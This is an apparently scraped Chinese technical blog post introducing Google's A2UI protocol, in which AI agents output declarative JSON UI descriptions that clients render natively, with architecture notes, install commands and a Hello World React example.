</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[A2UI协议：一个Agent与UI界面之间的翻译器]]></title>    <link>https://juejin.cn/post/7596975035437760521</link>    <guid>https://juejin.cn/post/7596975035437760521</guid>    <pubDate>2026-01-20T01:53:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035437760521" data-draft-id="7596975035437744137" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="A2UI协议：一个Agent与UI界面之间的翻译器"/> <meta itemprop="keywords" content="Agent,LLM,Gemini"/> <meta itemprop="datePublished" content="2026-01-20T01:53:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="深度学习机器"/> <meta itemprop="url" content="https://juejin.cn/user/486421344552179"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            A2UI协议：一个Agent与UI界面之间的翻译器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/486421344552179/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    深度学习机器
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:53:23.000Z" title="Tue Jan 20 2026 01:53:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、聊天模式在Agent应用中的局限性</h2>
<p>如果你对AI Agent有所了解，一定会有一个强烈的感受，随着LLM能力越来越强，生态越来越丰富，Agent也越来越聪明，但用户交互方式却还停留在最基础的聊天框模式。</p>
<p>无论是 LangChain、LangGraph，还是 AutoGen或者其他Agent框架，我们已经可以构建具备规划、记忆、工具调用能力的 Agent。但当任务一旦涉及用户输入多个字段、选择配置、分步骤操作时，Agent 往往会退化成输出一大段说明文字，然后再由用户手动去填写、选择或者进行具体的操作。对于Agent和用户而言，存在着天然的交互壁垒，Google在去年年底提出并开源的 A2UI（Agent-to-User Interface），本质上就是为了解决这个问题，允许让 Agent 直接生成界面，而不仅仅是文本。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0ee8243db17482fa8e4027287f2d6db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478802&amp;x-signature=F2NVLOmDlHiC0L%2FCFDNUjpKV1ys%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<h2 data-id="heading-1">二、A2UI的本质，一个协议而非框架</h2>
<h2 data-id="heading-2">1. 一种声明式UI协议</h2>
<p>A2UI的核心不是React、Vue 或Flutter组件，而是一套声明式UI协议。与以往的输出不同，Agent不再输出 HTML/JSX，而是输出类似下面的结构化JSON：</p>
<pre><code class="hljs language-css" lang="css">{
  "surfaceUpdate": {
    "surfaceId": <span class="hljs-string">"main"</span>,
    <span class="hljs-string">"components"</span>: [
      {
        "id": <span class="hljs-string">"name"</span>,
        <span class="hljs-string">"component"</span>: {
          "type": <span class="hljs-string">"TextField"</span>,
          <span class="hljs-string">"props"</span>: { "<span class="hljs-selector-tag">label</span>": <span class="hljs-string">"姓名"</span> }
        }
      }
    ]
  }
}
</code></pre>
<p>而前端只负责一件事，就是把组件的结构化描述映射成真实的本地 UI。</p>
<h2 data-id="heading-3">2. 安全性可控</h2>
<p>为什么不让 Agent 直接写前端代码？这是 A2UI 非常重要的一点设计哲学：</p>
<p>● Agent生成 HTML/JS代码：存在安全风险，风险不可靠</p>
<p>● Agent生成结构化JSON：前端只渲染白名单组件，风险更加可控</p>
<p>Google官方的表述说这样设计使得Agent的输出像数据一样安全，像代码一样表达。</p>
<h2 data-id="heading-4">3. 跨平台渲染</h2>
<p>A2UI 的组件是抽象的，一次生成，多端渲染，Agent 完全不关心前端技术栈，只描述“我要一个输入框 + 一个按钮”即可渲染出合适的UI界面。</p>

























<table><thead><tr><th>平台</th><th>渲染方式</th></tr></thead><tbody><tr><td>Web</td><td>React / Angular / Lit</td></tr><tr><td>iOS</td><td>SwiftUI</td></tr><tr><td>Android</td><td>Compose</td></tr><tr><td>Flutter</td><td>Widget</td></tr></tbody></table>
<h2 data-id="heading-5">4. 与模型解耦</h2>
<p>A2UI是一种协议，那么它就不是必须与Gemini模型绑定。A2UI对模型的要求只有一个： 能不能稳定输出结构化 JSON。所以对于常见的模型以及MaaS提供商，比如：</p>
<p>● OpenAI</p>
<p>● Claude</p>
<p>● Gemini</p>
<p>● 其他模型/API提供商</p>
<p>都完全可以使用。</p>
<h2 data-id="heading-6">三、技术原理</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/515998ba9646455696a5c07d7150023e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478802&amp;x-signature=ZojTGPZ1odIqC%2F%2BDWv6hOg0KQ8s%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>A2UI主要有三层架构，每一层都有清晰的分工。</p>
<h2 data-id="heading-7">1. 协议层：Agent-to-UI Communication</h2>
<p>比如Agent可能会生成带如下结构的Json输出：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"surfaceUpdate"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"surfaceId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"restaurant-search"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"components"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"search-form"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"component"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Form"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"children"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"TextField"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"props"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"placeholder"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"搜索餐厅..."</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Button"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"props"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"搜索"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-8">2. 渲染层：Framework-Agnostic Rendering</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a9912b709349c4954a427ddca7eb1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478802&amp;x-signature=oJPDPS31jB9rV3rYQW%2FLLUFF%2FVc%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>客户端与Agent之间是有预先定义好的渲染逻辑，当客户端收到Agent发送来的带有特殊格式的Json时，会对其中有效部分进行渲染。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 客户端渲染逻辑（伪代码）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A2UIRenderer</span> {
  <span class="hljs-title function_">render</span>(<span class="hljs-params">component, container</span>) {
    <span class="hljs-keyword">switch</span>(component.<span class="hljs-property">type</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'TextField'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextInput</span>(component.<span class="hljs-property">props</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-string">'Button'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(component.<span class="hljs-property">props</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-string">'Form'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Form</span>(component.<span class="hljs-property">children</span>);
      <span class="hljs-comment">// 更多组件...</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-9">3. 数据层：双向数据同步</h2>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dataModelUpdate"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"surfaceId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"restaurant-search"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"contents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"searchResults"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"valueArray"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
          <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"valueMap"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
              <span class="hljs-punctuation">{</span><span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"name"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"valueString"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"川香阁"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
              <span class="hljs-punctuation">{</span><span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rating"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"valueNumber"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4.5</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
              <span class="hljs-punctuation">{</span><span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cuisine"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"valueString"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"川菜"</span><span class="hljs-punctuation">}</span>
            <span class="hljs-punctuation">]</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-10">四、快速开始</h2>
<h2 data-id="heading-11">1. 环境准备</h2>
<p>在开始使用A2UI之前，确保开发环境满足以下要求：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查Node.js版本（需要16.0+）</span>
node --version

<span class="hljs-comment"># 检查npm版本</span>
npm --version
</code></pre>
<h2 data-id="heading-12">2. 安装步骤</h2>
<h3 data-id="heading-13">方法1：使用官方模板</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆官方快速开始模板</span>
git <span class="hljs-built_in">clone</span> https://github.com/google/A2UI.git
<span class="hljs-built_in">cd</span> A2UI/examples/quick-start

<span class="hljs-comment"># 安装依赖</span>
npm install

<span class="hljs-comment"># 启动开发服务器</span>
npm start
</code></pre>
<h3 data-id="heading-14">方法2：集成到现有项目</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装A2UI核心库</span>
npm install @google/a2ui

<span class="hljs-comment"># 安装渲染器（以React为例）</span>
npm install @google/a2ui-react

<span class="hljs-comment"># 安装类型定义</span>
npm install -D @types/a2ui
</code></pre>
<h2 data-id="heading-15">五、一个简单的示例</h2>
<p>让我们创建一个简单的”Hello World”应用：</p>
<h2 data-id="heading-16">1. 创建Agent</h2>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// agent/hello-agent.js</span>
<span class="hljs-keyword">import</span> { <span class="hljs-type">A2UIAgent</span> } from '<span class="hljs-meta">@google</span>/a2ui';

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloAgent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A2UIAgent</span> </span>{
  async handleMessage(userInput) {
    <span class="hljs-keyword">return</span> {
      surfaceUpdate: {
        surfaceId: <span class="hljs-string">"hello-world"</span>,
        components: [
          {
            id: <span class="hljs-string">"greeting-container"</span>,
            component: {
              <span class="hljs-class"><span class="hljs-keyword">type</span></span>: <span class="hljs-string">"Card"</span>,
              props: {
                title: <span class="hljs-string">"A2UI问候"</span>,
                variant: <span class="hljs-string">"elevated"</span>
              },
              children: [
                {
                  <span class="hljs-class"><span class="hljs-keyword">type</span></span>: <span class="hljs-string">"Text"</span>,
                  props: {
                    content: `你好！您输入的是：${userInput}`,
                    size: <span class="hljs-string">"large"</span>
                  }
                },
                {
                  <span class="hljs-class"><span class="hljs-keyword">type</span></span>: <span class="hljs-string">"Button"</span>,
                  props: {
                    text: <span class="hljs-string">"再次问候"</span>,
                    action: <span class="hljs-string">"greet_again"</span>
                  }
                }
              ]
            }
          }
        ]
      }
    };
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-type">HelloAgent</span>;
</code></pre>
<h2 data-id="heading-17">2. 创建客户端渲染器</h2>
<pre><code class="hljs language-ini" lang="ini">// client/App.jsx
import React, { useState } from 'react'<span class="hljs-comment">;</span>
import { A2UIRenderer } from '@google/a2ui-react'<span class="hljs-comment">;</span>
import HelloAgent from './agent/hello-agent'<span class="hljs-comment">;</span>

function App() {
  const <span class="hljs-section">[messages, setMessages]</span> = useState(<span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>
  const <span class="hljs-section">[userInput, setUserInput]</span> = useState('')<span class="hljs-comment">;</span>

  const <span class="hljs-attr">agent</span> = new HelloAgent()<span class="hljs-comment">;</span>

  const <span class="hljs-attr">handleSendMessage</span> = async () =&gt; {
    const <span class="hljs-attr">response</span> = await agent.handleMessage(userInput)<span class="hljs-comment">;</span>
    setMessages(<span class="hljs-attr">prev</span> =&gt; [...prev, response])<span class="hljs-comment">;</span>
    setUserInput('')<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">classname</span>=<span class="hljs-string">"app"</span>&gt;
      &lt;main <span class="hljs-attr">classname</span>=<span class="hljs-string">"chat-container"</span>&gt;
        {messages.map((message, index) =&gt; (
          &lt;a2uirenderer <span class="hljs-attr">key</span>=<span class="hljs-string">"{index}"</span> surfaceupdate=<span class="hljs-string">"{message.surfaceUpdate}"</span> <span class="hljs-literal">on</span>action=<span class="hljs-string">"{(action,"</span> data)=<span class="hljs-string">""</span>&gt; {
              console.log('Action triggered:', action, data)<span class="hljs-comment">;</span>
              if (<span class="hljs-attr">action</span> === <span class="hljs-string">'greet_again'</span>) {
                handleSendMessage()<span class="hljs-comment">;</span>
              }
            }}
          /&gt;
        ))}
      &lt;/a2uirenderer&gt;&lt;/main&gt;
      &lt;footer <span class="hljs-attr">classname</span>=<span class="hljs-string">"input-container"</span>&gt;
        &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> value=<span class="hljs-string">"{userInput}"</span> <span class="hljs-literal">on</span>change=<span class="hljs-string">"{(e)"</span> ==<span class="hljs-string">""</span>&gt; setUserInput(e.target.value)}
          <span class="hljs-attr">onKeyPress</span>={(e) =&gt; e.key === <span class="hljs-string">'Enter'</span> &amp;&amp; handleSendMessage()}
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入消息..."</span>
        /&gt;
        &lt;button <span class="hljs-attr">onclick</span>=<span class="hljs-string">"{handleSendMessage}"</span>&gt;发送&lt;/button&gt;
      &lt;/footer&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}

export default App<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-18">六、关于A2UI的一些疑问</h2>
<h2 data-id="heading-19">1. 前端需要引入A2UI官方npm包吗？</h2>
<p>不用。只需要在现有 React 项目中，加一层「A2UI Renderer」就行，如下所示：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatMessage</span>(<span class="hljs-params">{ msg }</span>) {
  <span class="hljs-keyword">if</span> (msg.<span class="hljs-property">type</span> === <span class="hljs-string">"text"</span>) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Bubble</span>&gt;</span>{msg.content}<span class="hljs-tag">&lt;/<span class="hljs-name">Bubble</span>&gt;</span></span>;
  <span class="hljs-keyword">if</span> (msg.<span class="hljs-property">type</span> === <span class="hljs-string">"a2ui"</span>) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">A2UIRenderer</span> <span class="hljs-attr">surface</span>=<span class="hljs-string">{msg.surfaceUpdate}</span> /&gt;</span></span>;
}
</code></pre>
<p>A2UI官方 SDK 本质上也是在做这件事，只是帮你封装好了。</p>
<h2 data-id="heading-20">2. LLM 一定要输出特殊 JSON吗？</h2>
<p>是的，这是 A2UI 的关键。但这并不意味着所有回复都要以A2UI的格式返回。真实业务中更合理的方式是大多数情况下依旧以传统的文本形式返回，只有当需要用户操作的时候才渲染为A2UI的格式。</p>
<h2 data-id="heading-21">七、总结</h2>
<p>在笔者看来，A2UI的意义不只是多了一种UI方案，而是在于它补齐了Agent从思考到执行的最后一环。对于Agent的开发者来说，可能不再需要去写各种业务相关的界面，而是可以专注于设计Agent能力边界。而Agent的终极形态，不再是聊天机器人，而是会自己搭界面的智能系统。 A2UI，可能正是这个方向上非常关键的一步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>